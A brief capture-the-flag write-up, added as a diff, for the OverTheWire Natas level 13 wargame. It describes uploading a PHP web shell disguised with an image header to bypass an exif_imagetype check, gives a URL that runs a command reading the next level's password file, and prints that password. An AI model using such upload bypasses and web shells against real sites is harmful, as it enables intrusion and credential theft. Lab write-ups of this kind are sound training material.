@@ -1,0 +1,7 @@
+Same as 12, upload shell.
+Need to bypass exif_imagetype so I added an image header to file.
+
+Browse to http://natas13.natas.labs.overthewire.org/upload/zdvs5cop23.php?cmd=cat%20/etc/natas_webpass/natas14
+
+Flag:
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
